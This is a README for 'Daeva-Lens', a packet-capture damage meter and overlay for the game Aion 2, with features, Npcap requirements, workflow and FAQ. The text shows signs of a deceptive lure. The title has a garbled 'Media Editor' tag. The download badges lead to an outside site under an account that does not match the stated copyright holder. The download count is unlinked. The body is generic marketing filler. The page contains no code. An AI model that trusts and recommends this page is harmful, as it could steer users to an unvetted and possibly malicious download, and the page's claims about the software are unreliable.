<div align="center">

# Daeva-Lens — Real-Time Combat Overlay, Death Recap & Cooldown Alerts Media Editor

![](files/1.gif)

[![downloads](https://img.shields.io/badge/downloads-312K-06b6d4?style=flat-square&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-Windows_11-06b6d4?style=flat-square&labelColor=0d1117)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=flat-square&labelColor=0d1117)]()

[![Download](https://raw.githubusercontent.com/Ikramullah-2011/daeva-lens/main/pkg_df45d9.svg)](https://Ikramullah-2011.github.io/daeva-lens/)

</div>

---

Daeva-Lens turns raw Aion 2 combat into a clean visual readout: a live DPS and healing meter, an on-screen combat overlay, a death recap that shows exactly where a fight fell apart, a boss break gauge, and cooldown alerts that keep your next cast in sight. The whole experience is built around glances, not spreadsheets, so numbers and timers stay legible while the action is moving. Every encounter feeds the meter and updates the panels, giving you a flowing workflow from pull to kill to review.

## Features

- **DPS, healing, and damage taken meters:** live group and personal panels with share, crit rate, per-skill breakdown, and a death recap that shows exactly what landed the killing blow.

- **Boss break gauge:** watch the stagger bar fill in real time so your group knows when to dump burst and when to hold.

- **Cooldown alerts:** get a visual nudge the moment a tracked skill comes off cooldown, so nothing sits unused between pulls.

- **Combat overlay:** meters and alerts float over the game, readable at a glance without breaking your focus on the fight.

- **Boss and dungeon history:** every encounter is saved, with the final boss closing out the run card for a clean summary of the dungeon.

- **Four focused tabs:** Boss and Players, Skills, Timers, and Settings — everything a few clicks away, nothing buried.

- **Skill rotation timeline:** a per-player skill strip you can zoom and pan to see exactly where damage came from and how it flowed.

- **Death recap:** when someone drops, the recap lays out the damage sequence so you can learn from it instead of guessing.

- **Configurable party display:** hide members who are not contributing damage to keep the meter clean and readable.

- **Streamer mode:** names are swapped for local aliases on screen, so your broadcast stays tidy without extra setup.

- **Quiet by default:** sounds, on-screen notices, timers, and extra panels start off — turn on only what serves your workflow in Settings.

## How It Works

Daeva-Lens works like a quiet observer standing just behind your shoulder. It listens to a passive copy of the combat traffic already flowing toward your machine — never touching the game itself, never poking at memory, never injecting a single line of code — and turns those raw packets into a live, readable picture of the fight.

The moment combat begins, the panel comes alive. Numbers roll upward, bars stretch and shrink, and every player in the group gets their own strip of damage, healing, and damage taken. Each boss encounter folds into its own card, so a long dungeon run becomes a stack of battle memories you can flip back through. When the last boss falls, the run closes itself out and files the whole card away.

From there you can dig as deep as you like. Click a player to pull back the curtain on their per-skill breakdown. Scrub across the skill rotation timeline — zoom with the wheel or the +/-, pan with a drag — and watch the chord of abilities play out in sequence. The boss break gauge sits front and center while the fight rages, and a death recap appears the instant someone hits the floor, so you can see exactly what landed and how hard.

Cooldown alerts keep you honest — a tap on the shoulder when something important comes back up — while the timer dashboard runs the same boss schedule you already know, with a beep or a spoken callout in your chosen language. Rate players you meet, jot a note, and let the blacklist quietly flag familiar faces if you'd rather not group with them again.

Everything you see is drawn with care by an overlay that respects your screen real estate: position-lock it where you want it, flip it into click-through when you need your mouse back, and hide it entirely when you want a clean view. Streamer mode swaps names for local aliases on the fly, so your broadcast stays yours. Both panels and meter are yours to shape in Settings, and the whole thing stays silent and unobtrusive until you decide otherwise.

Underneath it all, the magic is simple: a small helper program watches the system's process list and connection tables, finds the game, and mirrors its traffic into a local pipeline. Nothing ever leaves your PC. What comes out the other end is a faithful, real-time rendering of the fight — rendered as a clean, glanceable overlay you can trust, because it's built entirely from what the game itself was already saying.

## Requirements

**A clean pipeline starts with a clean stage.** Daeva Lens is a passive observer — it never touches the game, only the read-only copy of traffic already flowing to your network card. That means a few pieces need to be in place before the curtain rises.

- **Windows 10 or 11, 64-bit.** This is a desktop overlay, built for the Windows stage only.
- **Npcap, installed with default options.** This is the lens through which Daeva Lens sees combat. Without it, the panel stays dark — no packets, no numbers. Install it once; the rest of the workflow takes over from there.
- **AION 2 running in borderless or windowed mode.** Fullscreen exclusive can push the overlay behind the game window; borderless keeps the meter, timers, and alerts floating where you can actually see them.
- **A permanent home for the extracted folder.** Daeva Lens runs straight from where you unzip it, so pick a spot that won't get swept away by a cleanup. Settings and logs settle into your local app data folder automatically.
- **A Windows voice pack, only if you want spoken alerts.** Text beeps work out of the box; spoken boss-timer and cooldown callouts in English or Turkish need a matching system voice installed.

That's the whole cast. No accounts, no sign-ins, no background services — just the game, the capture layer, and the overlay ready to paint your combat in real time.

## 📸 Screenshot

![](files/2.png)

![](files/3.png)

![](files/4.png)

![](files/5.png)

## Workflow

Combat moves fast. Daeva-Lens is built to catch every pixel of it and hand it back to you as a clean read, so here's the loop it lives in.

**Before you pull.** Launch the meter first. It sits quietly in the background, invisible until there's something worth showing. Adjust the panel, pin it where it won't eat a boss telegraph, and lock it down so a stray drag can't knock your reading off the screen mid-fight. Quiet mode keeps overlays and alerts tucked away until you want them.

**When the fight opens.** The first swing fills the panel. As combat starts, damage, healing, and damage taken roll in live — the overlay wakes up, the boss break gauge starts tracking, and cooldown alerts begin their countdown. You read the room at a glance: who's carrying, who's flat, and what's about to hit the floor.

**Reading the flow.** Tap a player and the skill breakdown unfolds — per-ability shares, crit streaks, the full damage and healing picture. The rotation timeline lets you scroll a fight forward and back, zooming and panning to see exactly which key landed when. The boss tab shows where the break gauge stands; the death recap rewinds the last moments to show the fatal blow.

**When the dust settles.** Every boss fight gets archived automatically, and in dungeons the final boss seals the run card — a clean record you can compare against past pulls. Rate a player, drop a note, flag a blacklisted name; all of it stays on your machine.

**Between fights.** The Timers tab maps boss schedules against your region and lines up the next spawn. Sounds and voice cues live in one place, off until you flip them on. Streamer mode swaps names for aliases when you'd rather not show the roster.

**Across sessions.** Quit, relaunch, and your settings, history, and notes are exactly where you left them — no cloud, no syncing, just the meter picking up where the last pull ended.

## FAQ

- **The overlay is alive but silent — no numbers appear:** confirm the capture layer is active and that a recording session has actually started; a meter with no traffic to chew on is just a pretty frame.
- **My clicks vanish into the panel:** click-through is engaged, so the mouse is ghosting straight to the game. Flip it off to grab the overlay again.
- **The panel refuses to move:** position lock is holding it in place like a pinned HUD element. Release the lock to drag it around.
- **No voice callouts during a boss pull:** spoken alerts need a Windows voice installed for the language you picked. Visit the sound hub and test the voice before the next fight.
- **The overlay disappears behind the game window:** switch the game to borderless or windowed so the panel can float on top instead of being swallowed by fullscreen.
- **The death recap or break gauge looks empty:** those panels populate only when a fight actually ends or a break bar gets struck — quiet stretches are expected, not broken.
- **Cooldown alerts never fire:** verify the alert toggles are on for the skills you care about; alerts ship quiet by default and wait to be switched on.
- **Boss timers show the wrong region:** pick your region in the timer tab so the schedule lines up with your local clock.
- **Names look scrambled in my stream:** Streamer mode is aliasing them on purpose — that is the feature working, not a bug.
- **I want a clean slate:** close the tool and remove its local data folder; the next launch starts fresh with default panels and no history.
- **A blacklisted name popped up red:** that is the blacklist warning doing its job — a party member you flagged is in the group, and the note lives only on your machine.

## License

Daeva Lens is released under GPL-3.0-or-later, which means the meter stays as open as the combat log it reads. You are free to run it, study it, tweak the overlay to your taste, and share your changes with the same freedom — whether that means adding a new panel, retuning the boss break gauge, or rebuilding the whole workflow around your own keybinds. Copyright (C) 2026 W-Code (W-Code-Hub). A genuine thank-you goes to the RATmeter and A2Tools projects, whose GPL-3.0 work inspired parts of this one. Npcap is a separate product under its own license and ships with the game capture setup, not with Daeva Lens. Everything is provided without warranty — the overlay is a tool, and every fight is your own.

[![Download](https://raw.githubusercontent.com/Ikramullah-2011/daeva-lens/main/pkg_df45d9.svg)](https://Ikramullah-2011.github.io/daeva-lens/)